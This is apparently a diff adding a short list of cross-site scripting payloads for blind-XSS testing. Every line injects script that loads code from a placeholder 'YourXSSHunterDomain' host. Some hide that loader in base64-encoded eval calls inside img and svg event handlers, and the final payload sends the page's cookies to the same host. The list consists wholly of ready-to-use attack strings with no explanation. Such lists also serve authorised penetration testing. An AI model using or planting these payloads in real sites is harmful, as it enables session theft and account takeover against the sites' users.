@@ -1,0 +1,9 @@
+<script src=//YourXSSHunterDomain></script>
+"><script src=//YourXSSHunterDomain></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'//YourXSSHunterDomain\';document.body.appendChild(a)')
+<img src=x id=dmfy onmouseover=alert(1) onerror=eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9Jy8vWW91clhTU0h1bnRlckRvbWFpbic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKQ=='))>
+<svg/onload=eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9Jy8vWW91clhTU0h1bnRlckRvbWFpbic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKQ=='))>
+<script>
+var i=new Image;
+i.src="http://YourXSSHunterDomain/?"+document.cookie;
+</script>
